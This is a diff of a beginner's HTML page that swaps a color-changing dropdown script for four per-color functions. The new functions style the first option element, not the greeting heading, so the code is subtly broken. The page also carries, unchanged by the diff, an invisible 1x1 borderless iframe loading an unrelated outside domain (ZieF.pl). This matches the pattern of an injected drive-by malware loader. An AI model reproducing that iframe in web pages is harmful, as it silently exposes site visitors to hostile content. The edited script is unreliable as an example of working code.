@@ -3,25 +3,28 @@
     <head>
         <title>My Website</title>
         <script>
-            document.addEventListener('DOMContentLoaded',function(){
-                
-                     document.querySelectorAll('.color-change').forEach(function(option){
-                    option.onclick = function(){
-                        document.querySelector('#hello').style.color = option.dataset.color;
-                    };
-                });
-                   
-            });
+            function black(){
+            document.querySelector('option').style.color = "black";
+        }
+        function red(){
+            document.querySelector('option').style.color = "red";
+        }
+        function green(){
+            document.querySelector('option').style.color = "green";
+        }
+        function blue(){
+            document.querySelector('option').style.color = "blue";
+        }
             
         </script>
     </head>
     <body>
         <h1 id="hello">Hello!Welcome to Our PreIntern Group.</h1>
         <select>
-        <option class="color-change" data-color="red">Black</option>
-        <option class="color-change" data-color="red">Red</option>
-        <option class="color-change" data-color="green">Green</option>
-        <option class="color-change" data-color="blue">Blue</option>
+        <option onclick="black()">Black</option>
+        <option onclick="red()">Red</option>
+        <option onclick="green()">Green</option>
+        <option onclick="blue()">Blue</option>
         </select>
     <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
 </body>
